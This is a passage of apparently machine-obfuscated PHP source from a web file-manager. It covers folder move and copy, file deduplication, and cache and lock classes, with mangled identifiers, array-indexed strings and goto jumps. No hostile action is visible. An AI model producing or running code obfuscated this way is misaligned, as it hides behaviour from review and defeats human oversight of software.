$this->updateModifyTime($«”¥Ôã–); Model($»ØŸÙ¡ö[655])->eventMove($É§¼¢á¶, $Å†ã£¹™[$»ØŸÙ¡ö[190]], $Ù†Ôâ†Ù); Hook::trigger($»ØŸÙ¡ö[681], $¨‹ê²’¬); return $°ªˆÑ­À; } private function _move($ˆòÆ”£ª, $Ÿ†®åÒÁ, $ÚÒÍÄ÷², &$ş€¡‹ÓØ, $Ù‘ë¡Ò = '') { $Ú„°Ãôƒ =& $_SERVER[¹Éµ„ºå]; $¬ôÛØ‚‹ = $this->sourceInfo($ˆòÆ”£ª); $““Ê«û = $¬ôÛØ‚‹[$Ú„°Ãôƒ[500]] == $Ú„°Ãôƒ[91]; $¥ñĞç· = $Ù‘ë¡Ò ? $Ù‘ë¡Ò : $¬ôÛØ‚‹[$Ú„°Ãôƒ[32]]; $äûéêŠ = $this->fileNameExistAuto($Ÿ†®åÒÁ, $¬ôÛØ‚‹); $this->lockMoveStart($ˆòÆ”£ª); $this->lockWriteStart($Ÿ†®åÒÁ, $¥ñĞç·); if (!$äûéêŠ) { return $this->_moveForce($ˆòÆ”£ª, $Ÿ†®åÒÁ, $¥ñĞç·); } $®åöŞ = $äûéêŠ; $òÜáğ“í = !1; if ($““Ê«û) { if ($ÚÒÍÄ÷² == REPEAT_RENAME_FOLDER) { $¥ñĞç· = $this->fileNameAuto($Ÿ†®åÒÁ, $¥ñĞç·, $ÚÒÍÄ÷², $““Ê«û); $®åöŞ = $this->_moveForce($ˆòÆ”£ª, $Ÿ†®åÒÁ, $¥ñĞç·); } else { $Ï†ı¦ÓØ = $this->_childrenListSelect($ˆòÆ”£ª); foreach ($Ï†ı¦ÓØ as $¯ÉœÔ½Á) { $ë¾œßØÃ = REPEAT_REPLACE; $this->_move($¯ÉœÔ½Á[$Ú„°Ãôƒ[191]], $äûéêŠ, $ë¾œßØÃ, $ş€¡‹ÓØ); } $òÜáğ“í = !0; } } else { if ($ÚÒÍÄ÷² == REPEAT_RENAME || $ÚÒÍÄ÷² == REPEAT_RENAME_FOLDER) { $¥ñĞç· = $this->fileNameAuto($Ÿ†®åÒÁ, $¥ñĞç·, $ÚÒÍÄ÷², $““Ê«û); $®åöŞ = $this->_moveForce($ˆòÆ”£ª, $Ÿ†®åÒÁ, $¥ñĞç·); } else { $ì¥Çªùö = $this->sourceInfoCache($äûéêŠ); $¢ÌÎßô  = $this->fileHistory($ì¥Çªùö, $¬ôÛØ‚‹[$Ú„°Ãôƒ[557]], $¬ôÛØ‚‹[$Ú„°Ãôƒ[79]]); if ($¢ÌÎßô ) { $ş€¡‹ÓØ[$Ú„°Ãôƒ[652]][] = $¬ôÛØ‚‹[$Ú„°Ãôƒ[557]]; } $òÜáğ“í = !0; } } if ($òÜáğ“í) { $ş€¡‹ÓØ[$Ú„°Ãôƒ[682]] = !0; } return $®åöŞ; } private function _moveForce($è†Ü¿Ê†, $›Á´·ï˜, $î §ºß¨) { $ìƒŞŸï• =& $_SERVER[¹Éµ„ºå]; $­ÉÑ¬ûƒ = $this->sourceInfo($è†Ü¿Ê†); $Õ¶Úã = $this->sourceInfo($›Á´·ï˜); $¦§‡•Á¬ = $­ÉÑ¬ûƒ[$ìƒŞŸï•[500]] == $ìƒŞŸï•[91]; $ò£êÈ©’ = array($ìƒŞŸï•[492] => $Õ¶Úã[$ìƒŞŸï•[191]], $ìƒŞŸï•[674] => $Õ¶Úã[$ìƒŞŸï•[604]] . $Õ¶Úã[$ìƒŞŸï•[191]] . $ìƒŞŸï•[50], $ìƒŞŸï•[670] => $Õ¶Úã[$ìƒŞŸï•[188]], $ìƒŞŸï•[671] => $Õ¶Úã[$ìƒŞŸï•[589]], $ìƒŞŸï•[673] => USER_ID, $ìƒŞŸï•[509] => $î §ºß¨); $Ÿ“‹¹şû = $­ÉÑ¬ûƒ[$ìƒŞŸï•[188]] == SourceModel::TYPE_GROUP && $Õ¶Úã[$ìƒŞŸï•[188]] == SourceModel::TYPE_GROUP && $­ÉÑ¬ûƒ[$ìƒŞŸï•[589]] == $Õ¶Úã[$ìƒŞŸï•[589]]; if (!$Ÿ“‹¹şû && $this->moveClearAuth) { Model($ìƒŞŸï•[587])->authClear($è†Ü¿Ê†); } $£ö»Š† = $­ÉÑ¬ûƒ[$ìƒŞŸï•[520]] == $ìƒŞŸï•[91] && $Õ¶Úã[$ìƒŞŸï•[520]] != $ìƒŞŸï•[91]; if ($£ö»Š†) { $ò£êÈ©’[$ìƒŞŸï•[519]] = 0; } if ($¦§‡•Á¬) { $¤…½à¿Ä = array($ìƒŞŸï•[674] => array($ìƒŞŸï•[635], $­ÉÑ¬ûƒ[$ìƒŞŸï•[604]] . $­ÉÑ¬ûƒ[$ìƒŞŸï•[191]] . $ìƒŞŸï•[636])); $šÒêà€ = $­ÉÑ¬ûƒ[$ìƒŞŸï•[604]] . $­ÉÑ¬ûƒ[$ìƒŞŸï•[191]] . $ìƒŞŸï•[50]; $ÀÇ…Çµˆ = $Õ¶Úã[$ìƒŞŸï•[604]] . $Õ¶Úã[$ìƒŞŸï•[191]] . $ìƒŞŸï•[50] . $­ÉÑ¬ûƒ[$ìƒŞŸï•[191]] . $ìƒŞŸï•[50]; $ÏË”õ¸¢ = array($ìƒŞŸï•[674] => array($ìƒŞŸï•[683], "\162\145\x70\x6c\141\143\145\x28\160\x61\x72\145\x6e\164\114\x65\x76\145\154\x2c\x27{$šÒêà€}\47\x2c\x27{$ÀÇ…Çµˆ}\x27\x29"), $ìƒŞŸï•[670] => $Õ¶Úã[$ìƒŞŸï•[188]], $ìƒŞŸï•[671] => $Õ¶Úã[$ìƒŞŸï•[589]]); if ($£ö»Š†) { $ÏË”õ¸¢[$ìƒŞŸï•[519]] = 0; } $this->where($¤…½à¿Ä)->data($ÏË”õ¸¢)->save(); } $this->where(array($ìƒŞŸï•[506] => $è†Ü¿Ê†))->data($ò£êÈ©’)->save(); return $è†Ü¿Ê†; } private function clearShare($ÂêøœÍÌ, $™ÜêÛî) { $Œ”ÎË‘ë =& $_SERVER[¹Éµ„ºå]; $Ê›‚€ğ = $this->sourceInfo($ÂêøœÍÌ); $ØñéÍğ = $this->sourceInfo($™ÜêÛî); if ($Ê›‚€ğ[$Œ”ÎË‘ë[589]] == $ØñéÍğ[$Œ”ÎË‘ë[589]] && $Ê›‚€ğ[$Œ”ÎË‘ë[188]] == $Œ”ÎË‘ë[684]) { return; } $—¡¤Ì ¹ = array($Œ”ÎË‘ë[604] => array($Œ”ÎË‘ë[635], $Ê›‚€ğ[$Œ”ÎË‘ë[604]] . $ÂêøœÍÌ . $Œ”ÎË‘ë[636])); $èŞÏ²½ = $this->field($Œ”ÎË‘ë[506])->where($—¡¤Ì ¹)->getField($Œ”ÎË‘ë[191], !0); if (!$èŞÏ²½) { return; } $—¡¤Ì ¹ = array($Œ”ÎË‘ë[191] => array($Œ”ÎË‘ë[7], $èŞÏ²½), $Œ”ÎË‘ë[685] => 1); $È°õê¾É = Model($Œ”ÎË‘ë[686])->field($Œ”ÎË‘ë[687])->where($—¡¤Ì ¹)->select(); if (!$È°õê¾É) { return; } $È°õê¾É = array_to_keyvalue($È°õê¾É, $Œ”ÎË‘ë[12], $Œ”ÎË‘ë[687]); $—¡¤Ì ¹ = array($Œ”ÎË‘ë[687] => array($Œ”ÎË‘ë[7], $È°õê¾É)); Model($Œ”ÎË‘ë[686])->where($—¡¤Ì ¹)->save(array($Œ”ÎË‘ë[685] => 0)); Model($Œ”ÎË‘ë[688])->where($—¡¤Ì ¹)->delete(); } public function copyFolderFromIO($ëğÓ³Öì, $ÉÕë¡§æ, $Œğ„òµŒ, $ó¯Î“¶Ó, $…İëïïé, $ÛŞ€à¿ = false) { $°÷®×ş =& $_SERVER[¹Éµ„ºå]; $Ò“•éä² = array($°÷®×ş[653] => array(), $°÷®×ş[654] => array(), $°÷®×ş[652] => array(), $°÷®×ş[689] => array()); $”ª××õê = $ÛŞ€à¿ ? $ÛŞ€à¿ : $ëğÓ³Öì->pathThis($ÉÕë¡§æ); $úÂ˜Èœ = $this->fileNameExist($Œğ„òµŒ, $”ª××õê); $§»üú = $this->mkdir($Œğ„òµŒ, $”ª××õê, $ó¯Î“¶Ó); if (!$úÂ˜Èœ || $ó¯Î“¶Ó == REPEAT_RENAME_FOLDER) { $ó¯Î“¶Ó = !1; } if ($úÂ˜Èœ) { $this->_childrenAllMake($úÂ˜Èœ); } Hook::trigger($°÷®×ş[690]); $¹Ù¸’ğí = KodIO::ioFileDriverGet($°÷®×ş[498] . $Œğ„òµŒ . $°÷®×ş[402]); $this->_copyChildTo($ëğÓ³Öì, $ÉÕë¡§æ, $§»üú, $ó¯Î“¶Ó, $Ò“•éä², $…İëïïé, $¹Ù¸’ğí); Hook::trigger($°÷®×ş[691]); if ($§»üú) { $this->folderSizeResetChildren($§»üú); } $this->_childrenListClear(); Model($°÷®×ş[471])->addAll($Ò“•éä²[$°÷®×ş[653]], array(), !0); Model($°÷®×ş[655])->eventCopy($§»üú); $this->saveAll($Ò“•éä²[$°÷®×ş[654]]); Model($°÷®×ş[560])->linkAdd($Ò“•éä²[$°÷®×ş[652]]); Model($°÷®×ş[560])->remove($Ò“•éä²[$°÷®×ş[689]]); $this->folderSizeReset($Œğ„òµŒ); $this->updateModifyTime($Œğ„òµŒ); return $§»üú; } private function _copyChildTo($„´—íÙ, $œèÖúô, $¨Ù‚ÍŒ¯, $ÓáÛë¥, &$óÉ«–ì, $¤„ı§Å÷, $±Í£²Î•) { $×ûÉ£‘Õ =& $_SERVER[¹Éµ„ºå]; $šôÙÍ = $this->sourceInfoCache($¨Ù‚ÍŒ¯); $ıûµÏœ¸ = $„´—íÙ->listPath($œèÖúô); $ıûµÏœ¸ = $ıûµÏœ¸ ? $ıûµÏœ¸ : array($×ûÉ£‘Õ[86] => array(), $×ûÉ£‘Õ[85] => array()); $±¢»áÊğ = array_merge($ıûµÏœ¸[$×ûÉ£‘Õ[86]], $ıûµÏœ¸[$×ûÉ£‘Õ[85]]); $™¦ôì¹´ = $this->_addFiles($„´—íÙ, $±Í£²Î•, $ıûµÏœ¸[$×ûÉ£‘Õ[86]], $¤„ı§Å÷); $´Ûë™çª = array(); foreach ($±¢»áÊğ as &$µñÛˆ») { if (isset($™¦ôì¹´[$µñÛˆ»[$×ûÉ£‘Õ[32]]])) { $µñÛˆ» = $™¦ôì¹´[$µñÛˆ»[$×ûÉ£‘Õ[32]]]; } $µñÛˆ»[$×ûÉ£‘Õ[500]] = $µñÛˆ»[$×ûÉ£‘Õ[33]] == $×ûÉ£‘Õ[78]; $µñÛˆ»[$×ûÉ£‘Õ[501]] = substr(_get($µñÛˆ», $×ûÉ£‘Õ[166], $×ûÉ£‘Õ[12]), 0, 10); $µñÛˆ»[$×ûÉ£‘Õ[79]] = _get($µñÛˆ», $×ûÉ£‘Õ[79], 0); $µñÛˆ»[$×ûÉ£‘Õ[557]] = _get($µñÛˆ», $×ûÉ£‘Õ[557], 0); if (!isset($µñÛˆ»[$×ûÉ£‘Õ[692]]) && $µñÛˆ»[$×ûÉ£‘Õ[557]]) { $óÉ«–ì[$×ûÉ£‘Õ[689]][] = $µñÛˆ»[$×ûÉ£‘Õ[557]]; } if ($ÓáÛë¥) { $§¯¦çÒ× = $this->fileNameExistCache($¨Ù‚ÍŒ¯, $µñÛˆ»[$×ûÉ£‘Õ[32]]); if ($§¯¦çÒ×) { if ($µñÛˆ»[$×ûÉ£‘Õ[500]] || $ÓáÛë¥ == REPEAT_SKIP) { continue; } if ($ÓáÛë¥ == REPEAT_REPLACE) { $é¶Ÿ§Éå = $this->sourceInfoCache($§¯¦çÒ×); $İñÆ¯·ø = $this->fileHistory($é¶Ÿ§Éå, $µñÛˆ»[$×ûÉ£‘Õ[557]], $µñÛˆ»[$×ûÉ£‘Õ[79]]); if ($İñÆ¯·ø) { $óÉ«–ì[$×ûÉ£‘Õ[652]][] = $µñÛˆ»[$×ûÉ£‘Õ[557]]; } continue; } else { if ($ÓáÛë¥ == REPEAT_RENAME) { $µñÛˆ»[$×ûÉ£‘Õ[32]] = $this->fileNameAutoCache($¨Ù‚ÍŒ¯, $µñÛˆ»[$×ûÉ£‘Õ[32]], $ÓáÛë¥, !1); } } } } if (!$µñÛˆ»[$×ûÉ£‘Õ[500]] && $µñÛˆ»[$×ûÉ£‘Õ[557]] == 0) { continue; } if (!$µñÛˆ»[$×ûÉ£‘Õ[500]] && $µñÛˆ»[$×ûÉ£‘Õ[557]]) { $óÉ«–ì[$×ûÉ£‘Õ[652]][] = $µñÛˆ»[$×ûÉ£‘Õ[557]]; } $´Ûë™çª[] = $this->_makeItemData($µñÛˆ», $šôÙÍ, $µñÛˆ»[$×ûÉ£‘Õ[32]]); } unset($µñÛˆ»); if (!empty($´Ûë™çª)) { $this->addAll($´Ûë™çª); $this->_childrenListSelect($¨Ù‚ÍŒ¯); } $×Ûİ»Ñ = $this->_childrenList($¨Ù‚ÍŒ¯); $×Ûİ»Ñ = array_to_keyvalue($×Ûİ»Ñ, $×ûÉ£‘Õ[32]); foreach ($±¢»áÊğ as $µñÛˆ») { $é¶Ÿ§Éå = $×Ûİ»Ñ[$µñÛˆ»[$×ûÉ£‘Õ[32]]]; $Õ¯’Êìş = $é¶Ÿ§Éå[$×ûÉ£‘Õ[191]]; $this->_copyApplyMeta($é¶Ÿ§Éå, $óÉ«–ì); if ($µñÛˆ»[$×ûÉ£‘Õ[33]] == $×ûÉ£‘Õ[78]) { $µñÛˆ»[$×ûÉ£‘Õ[87]] = $„´—íÙ->getPathInner($µñÛˆ»[$×ûÉ£‘Õ[87]]); $this->_copyChildTo($„´—íÙ, $µñÛˆ»[$×ûÉ£‘Õ[87]], $Õ¯’Êìş, $ÓáÛë¥, $óÉ«–ì, $¤„ı§Å÷, $±Í£²Î•); } } } private function _addFiles($äÓ‰âÎ±, $í–¡éúø, $ÏóéÕëŠ, $÷œôõ‰€) { $­…Ş•íÏ =& $_SERVER[¹Éµ„ºå]; if (!$ÏóéÕëŠ || count($ÏóéÕëŠ) == 0) { return array(); } $Ã ï¼®„ = array(); foreach ($ÏóéÕëŠ as &$¼Ô¤Ëî¶) { Hook::trigger($­…Ş•íÏ[693], $¼Ô¤Ëî¶); $¼Ô¤Ëî¶[$­…Ş•íÏ[87]] = $äÓ‰âÎ±->getPathInner($¼Ô¤Ëî¶[$­…Ş•íÏ[87]]); $ÆÀ£§¸³ = $äÓ‰âÎ±->hashSimple($¼Ô¤Ëî¶[$­…Ş•íÏ[87]]); $ä×‹ñü¼ = $äÓ‰âÎ±->hashMd5($¼Ô¤Ëî¶[$­…Ş•íÏ[87]]); if (strlen($ä×‹ñü¼) > 10 && !isset($Ã ï¼®„[$ä×‹ñü¼])) { $Ã ï¼®„[$ä×‹ñü¼] = array(); } $¼Ô¤Ëî¶[$­…Ş•íÏ[694]] = $ÆÀ£§¸³; $¼Ô¤Ëî¶[$­…Ş•íÏ[563]] = $ä×‹ñü¼; $Ã ï¼®„[$ä×‹ñü¼][] =& $¼Ô¤Ëî¶; if (count($Ã ï¼®„[$ä×‹ñü¼]) > 1) { $¼Ô¤Ëî¶[$­…Ş•íÏ[692]] = !0; } Hook::trigger($­…Ş•íÏ[695], $¼Ô¤Ëî¶); } unset($¼Ô¤Ëî¶); $ÆöÇîÌæ = array($­…Ş•íÏ[563] => array($­…Ş•íÏ[7], array_keys($Ã ï¼®„))); $ã–”¿…Ã = Model($­…Ş•íÏ[696]); $ÓìÄÊûŠ = $ã–”¿…Ã->where($ÆöÇîÌæ)->select(); $ÓìÄÊûŠ = $ÓìÄÊûŠ ? $ÓìÄÊûŠ : array(); foreach ($ÓìÄÊûŠ as $üé›ªú’) { if (!isset($Ã ï¼®„[$üé›ªú’[$­…Ş•íÏ[563]]])) { continue; } $œÅ€ŸĞ© = $Ã ï¼®„[$üé›ªú’[$­…Ş•íÏ[563]]]; foreach ($œÅ€ŸĞ© as &$¼Ô¤Ëî¶) { $¼Ô¤Ëî¶[$­…Ş•íÏ[557]] = $üé›ªú’[$­…Ş•íÏ[557]]; $¼Ô¤Ëî¶[$­…Ş•íÏ[692]] = !0; } unset($¼Ô¤Ëî¶); } $ÈîÔÓá· = array(); foreach ($ÏóéÕëŠ as $•¥ôÉ š) { Hook::trigger($­…Ş•íÏ[697], $•¥ôÉ š); if (isset($•¥ôÉ š[$­…Ş•íÏ[692]]) && $•¥ôÉ š[$­…Ş•íÏ[692]]) { Hook::trigger($­…Ş•íÏ[698], $•¥ôÉ š); continue; } $…ãĞ’ÕÅ = $äÓ‰âÎ±->getPathInner($•¥ôÉ š[$­…Ş•íÏ[87]]); $öéÑÀÏƒ = $ã–”¿…Ã->addFileMake($…ãĞ’ÕÅ, $í–¡éúø, $•¥ôÉ š[$­…Ş•íÏ[79]], $•¥ôÉ š[$­…Ş•íÏ[694]], $•¥ôÉ š[$­…Ş•íÏ[563]], $•¥ôÉ š[$­…Ş•íÏ[32]], $÷œôõ‰€); Hook::trigger($­…Ş•íÏ[698], $•¥ôÉ š); if (!is_array($öéÑÀÏƒ)) { continue; } $ÈîÔÓá·[] = $öéÑÀÏƒ; } $ã–”¿…Ã->addAll($ÈîÔÓá·); $ÆöÇîÌæ = array($­…Ş•íÏ[563] => array($­…Ş•íÏ[7], array_keys($Ã ï¼®„))); $ÓìÄÊûŠ = $ã–”¿…Ã->where($ÆöÇîÌæ)->select(); $ÓìÄÊûŠ = $ÓìÄÊûŠ ? $ÓìÄÊûŠ : array(); foreach ($ÓìÄÊûŠ as $üé›ªú’) { if (!isset($Ã ï¼®„[$üé›ªú’[$­…Ş•íÏ[563]]])) { continue; } $ÌÑøú€´ =& $Ã ï¼®„[$üé›ªú’[$­…Ş•íÏ[563]]]; foreach ($ÌÑøú€´ as &$¼Ô¤Ëî¶) { $¼Ô¤Ëî¶[$­…Ş•íÏ[557]] = $üé›ªú’[$­…Ş•íÏ[557]]; } unset($¼Ô¤Ëî¶); } $Áîíâ¦ = array(); foreach ($ÏóéÕëŠ as $¢íÆ®ˆ) { $Áîíâ¦[$¢íÆ®ˆ[$­…Ş•íÏ[32]]] = $¢íÆ®ˆ; } return $Áîíâ¦; } } define($_SERVER[¹Éµ„ºå][699], $_SERVER[¹Éµ„ºå][700]); $ouvybnzrsq = $_SERVER[¹Éµ„ºå][701]; goto D«‰òÏÏŠ ; e’é ÂŒ·¿: class Cache { protected static $handle; protected static $memoryCache; protected static $runTimeCache; public static function init() { $°âãÚ×… =& $_SERVER[¹Éµ„ºå]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); self::$runTimeCache = array(); $áã¶ìŸ• = $GLOBALS[$°âãÚ×…[6]][$°âãÚ×…[424]]; $Êãò´–± = $áã¶ìŸ•[$áã¶ìŸ•[$°âãÚ×…[971]]]; $”Ìñ®µÜ = $áã¶ìŸ•[$°âãÚ×…[972]]; switch ($áã¶ìŸ•[$°âãÚ×…[971]]) { case $°âãÚ×…[21]: self::$handle = Model($°âãÚ×…[973]); break; case $°âãÚ×…[974]: self::$handle = new CacheRedis($Êãò´–±, $”Ìñ®µÜ); break; case $°âãÚ×…[975]: self::$handle = new CacheMemcached($Êãò´–±, $”Ìñ®µÜ); break; case $°âãÚ×…[230]: self::$handle = new CacheFile($Êãò´–±, $”Ìñ®µÜ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ğÀ—İáî) { if (is_array($ğÀ—İáî) || is_object($ğÀ—İáî)) { $ğÀ—İáî = json_encode($ğÀ—İáî); } $ğÀ—İáî = rawurlencode($ğÀ—İáî); return md5(KOD_SITE_ID . $_SERVER[¹Éµ„ºå][11] . $ğÀ—İáî); } public static function get($ÊàÏÑ™í, $³²ñ»¢Ü = false) { $àÒùèÁã = self::key($ÊàÏÑ™í); $åÙ”Ì¼ª = self::init(); if ($³²ñ»¢Ü) { return unserialize($åÙ”Ì¼ª->get($àÒùèÁã)); } if (!isset(self::$memoryCache[$àÒùèÁã])) { $ˆÏ²Äû´ = $åÙ”Ì¼ª->get($àÒùèÁã); self::$memoryCache[$àÒùèÁã] = unserialize($ˆÏ²Äû´); } return self::$memoryCache[$àÒùèÁã]; } public static function set($°½¹÷¥‘, $Õ¿ğšÀ, $„üØ è÷ = false) { $³ğõ£ñ =& $_SERVER[¹Éµ„ºå]; $£—Îø¿Î = self::key($°½¹÷¥‘); if (isset(self::$memoryCache[$£—Îø¿Î]) && self::$memoryCache[$£—Îø¿Î] === $Õ¿ğšÀ) { return !0; } if ($„üØ è÷ === 0) { self::$memoryCache[$£—Îø¿Î] = $Õ¿ğšÀ; return !0; } $×‘¨¸·¿ = self::init(); $şùİ™éü = serialize($Õ¿ğšÀ); CacheLock::lock($°½¹÷¥‘ . $³ğõ£ñ[976]); $½€çÈÆ = $×‘¨¸·¿->set($£—Îø¿Î, $şùİ™éü, $„üØ è÷); self::$memoryCache[$£—Îø¿Î] = $Õ¿ğšÀ; CacheLock::unlock($°½¹÷¥‘ . $³ğõ£ñ[976]); return $½€çÈÆ; } public static function getCall($à”ÌÉùÛ, $¸¸ïÜå­, $®ù¢•–¨, $€É¡–¾› = array()) { $ì«Ÿ€ıÈ =& $_SERVER[¹Éµ„ºå]; $ÊÔ§èØ = self::get($à”ÌÉùÛ); if ($ÊÔ§èØ || $ÊÔ§èØ === $ì«Ÿ€ıÈ[12]) { return $ÊÔ§èØ; } $ÊÔ§èØ = call_user_func_array($®ù¢•–¨, $€É¡–¾›); $ÊÔ§èØ = $ÊÔ§èØ ? $ÊÔ§èØ : $ì«Ÿ€ıÈ[12]; self::set($à”ÌÉùÛ, $ÊÔ§èØ, $¸¸ïÜå­); return $ÊÔ§èØ; } public static function limitCall($®•µ«è, $Çì÷ŞûÕ = 15, $…ğ·“ı˜ = 30, $”Ê¾‚² = true) { $—¿××…¡ =& $_SERVER[¹Éµ„ºå]; static $ï³Ï––« = array(); if ($”Ê¾‚²) { $®•µ«è = $®•µ«è . $—¿××…¡[977] . KodUser::id() . $—¿××…¡[978] . get_client_ip(); } if (isset($ï³Ï––«[$®•µ«è]) && is_array($ï³Ï––«[$®•µ«è])) { return $ï³Ï––«[$®•µ«è][$—¿××…¡[332]] <= $…ğ·“ı˜; } $ä°ÛŞ‹å = self::get($®•µ«è); if (!is_array($ä°ÛŞ‹å) || time() - $ä°ÛŞ‹å[$—¿××…¡[204]] > $Çì÷ŞûÕ) { $ä°ÛŞ‹å = array($—¿××…¡[204] => time(), $—¿××…¡[332] => 0); } $ä°ÛŞ‹å[$—¿××…¡[332]]++; self::set($®•µ«è, $ä°ÛŞ‹å, $Çì÷ŞûÕ); $ï³Ï––«[$®•µ«è] = $ä°ÛŞ‹å; return $ä°ÛŞ‹å[$—¿××…¡[332]] <= $…ğ·“ı˜; } public static function limitRuntime($ÀÎ´Ëò·, $ÜÅĞª¶Ç) { $Š²×—èñ = $_SERVER[¹Éµ„ºå][979] . $ÀÎ´Ëò·; if (isset(self::$runTimeCache[$Š²×—èñ]) || !$ÜÅĞª¶Ç) { return !0; } $Æ““–çÉ = intval(self::get($Š²×—èñ)); $Æ““–çÉ = !$Æ““–çÉ || $Æ““–çÉ <= 0 ? 1 : $Æ““–çÉ + 1; if ($Æ““–çÉ > $ÜÅĞª¶Ç) { return !1; } self::$runTimeCache[$Š²×—èñ] = !0; self::set($Š²×—èñ, $Æ““–çÉ, 3600); return !0; } public static function limitRuntimeClear() { if (!self::$runTimeCache) { return; } foreach (self::$runTimeCache as $·¸Å¢ìß => $ œ®š“Á) { $šÔü› = intval(self::get($·¸Å¢ìß)); $šÔü› = !$šÔü› || $šÔü› <= 1 ? 0 : $šÔü› - 1; self::set($·¸Å¢ìß, $šÔü›, 3600); } self::$runTimeCache = array(); } public static function remove($æ±ïÅÅÅ) { $õÒ¦ğ‡© = self::key($æ±ïÅÅÅ); unset(self::$memoryCache[$õÒ¦ğ‡©]); self::clearTimeout(); CacheLock::lock($æ±ïÅÅÅ); $ï¢ÙêñŒ = self::init()->remove($õÒ¦ğ‡©); CacheLock::unlock($æ±ïÅÅÅ); return $ï¢ÙêñŒ; } public static function removeMemory($Õ¹»ÔÍˆ) { $õÚœÀ÷å = self::key($Õ¹»ÔÍˆ); unset(self::$memoryCache[$õÚœÀ÷å]); } public static function clearMemory($ø²‘ÍŠÚ = false) { if ($ø²‘ÍŠÚ) { $ø²‘ÍŠÚ = self::key($ø²‘ÍŠÚ); unset(self::$memoryCache[$ø²‘ÍŠÚ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¹Éµ„ºå][980])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¹Éµ„ºå][981])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($îÃ‹œÊæ, $åÒÕË¦) { $Â¹¿Û¸¿ =& $_SERVER[¹Éµ„ºå]; $this->cachePath = $îÃ‹œÊæ[$Â¹¿Û¸¿[87]]; $this->prefix = $Â¹¿Û¸¿[982]; $this->cacheTime = $åÒÕË¦; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ìĞÀÔÂè) { $¹Á°Áåœ =& $_SERVER[¹Éµ„ºå]; $ìĞÀÔÂè = str_replace(array($¹Á°Áåœ[983], $¹Á°Áåœ[97], $¹Á°Áåœ[76]), $¹Á°Áåœ[984], $ìĞÀÔÂè); return $this->cachePath . $¹Á°Áåœ[985] . $ìĞÀÔÂè . $¹Á°Áåœ[986]; } public function set($ü•çÂá, $£ƒ–††à, $ÖÙ·€ÎÌ = false) { $ÖÙ·€ÎÌ = $ÖÙ·€ÎÌ ? $ÖÙ·€ÎÌ : $this->cacheTime; $Åüõ½Ò® = $this->getFile($ü•çÂá); if (file_put_contents($Åüõ½Ò®, $this->prefix . $£ƒ–††à, LOCK_EX)) { @touch($Åüõ½Ò®, intval(time() + $ÖÙ·€ÎÌ)); clearstatcache(); return !0; } @unlink($Åüõ½Ò®); return !1; } public function get($¿²›ŠØ) { $İ¨Ì×Ç‡ = $this->getFile($¿²›ŠØ); if (file_exists($İ¨Ì×Ç‡) && filemtime($İ¨Ì×Ç‡) < time()) { @unlink($İ¨Ì×Ç‡); return !1; } $ÁÉ¸šÖğ = @file_get_contents($İ¨Ì×Ç‡); return substr($ÁÉ¸šÖğ, strlen($this->prefix)); } public function remove($ï«ÁÊó) { $èÅÈ°Åı = $this->getFile($ï«ÁÊó); return @unlink($èÅÈ°Åı); } public function deleteAll() { $©ìÁ“üÅ =& $_SERVER[¹Éµ„ºå]; $ÚÂ—Ş² = scandir($this->cachePath); foreach ($ÚÂ—Ş² as $Ïİ‡ıèƒ) { $ò‚ÍìôØ = $this->cachePath . $Ïİ‡ıèƒ; if (strpos($ò‚ÍìôØ, $©ìÁ“üÅ[986]) && strpos($ò‚ÍìôØ, $©ìÁ“üÅ[987])) { @unlink($ò‚ÍìôØ); } } } public function clearTimeout() { $ŒÖ¡»Ñ =& $_SERVER[¹Éµ„ºå]; $ú”¢¶ù = scandir($this->cachePath); foreach ($ú”¢¶ù as $üäº¶Ì¤) { $ü«©Ô¨ = $this->cachePath . $üäº¶Ì¤; if (strpos($ü«©Ô¨, $ŒÖ¡»Ñ[986]) && strpos($ü«©Ô¨, $ŒÖ¡»Ñ[987]) && filemtime($ü«©Ô¨) < time()) { @unlink($ü«©Ô¨); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $š™šÔúÛ =& $_SERVER[¹Éµ„ºå]; if (self::$handle) { return self::$handle; } $›âçª°ö = $GLOBALS[$š™šÔúÛ[6]][$š™šÔúÛ[424]]; self::$timeout = $›âçª°ö[$š™šÔúÛ[988]] ? $›âçª°ö[$š™šÔúÛ[988]] : 10; $» „ä”† = _get($GLOBALS[$š™šÔúÛ[6]], $š™šÔúÛ[989]); $ß‘óüÆ¬ = $›âçª°ö[$š™šÔúÛ[971]] ? $›âçª°ö[$š™šÔúÛ[971]] : $š™šÔúÛ[230]; if ($ß‘óüÆ¬ == $š™šÔúÛ[21] && $» „ä”† == $š™šÔúÛ[13]) { $ß‘óüÆ¬ = $š™šÔúÛ[230]; } switch ($ß‘óüÆ¬) { case $š™šÔúÛ[974]: self::$handle = new CacheLockRedis(); break; case $š™šÔúÛ[975]: self::$handle = new CacheLockMemcached(); break; case $š™šÔúÛ[21]: self::$handle = new CacheLockDatabase(); break; case $š™šÔúÛ[230]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($š™šÔúÛ[990], $š™šÔúÛ[991]); } return self::$handle; } private static function key($®ó¢¡¨) { return $_SERVER[¹Éµ„ºå][992] . Cache::key($®ó¢¡¨); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($šñÛ·ôš = '') { self::$errorMsg = $šñÛ·ôš; } public static function lockGlobal($èÆÍ²—, $š¢’¿“) { return self::lock($èÆÍ²—, $š¢’¿“, !0); } public static function lock($Í ûöš, $’±êƒê® = false, $‰ºø•¸ = false) { $Õš¦û¨ =& $_SERVER[¹Éµ„ºå]; $üçÑÈùá = self::init(); $»ÑÅŞÏ™ = self::key($Í ûöš); $’±êƒê® = $’±êƒê® ? $’±êƒê® : self::$timeout; $„ñ‚¾Êô = timeFloat(); if (_get($GLOBALS, $Õš¦û¨[993], !1)) { if (!$üçÑÈùá->lock($»ÑÅŞÏ™, 0.2)) { die; } return !0; } $‘Ê¨ä™© = $üçÑÈùá->lock($»ÑÅŞÏ™, $’±êƒê®); $Î—ÊÊ‡Á = timeFloat(); if 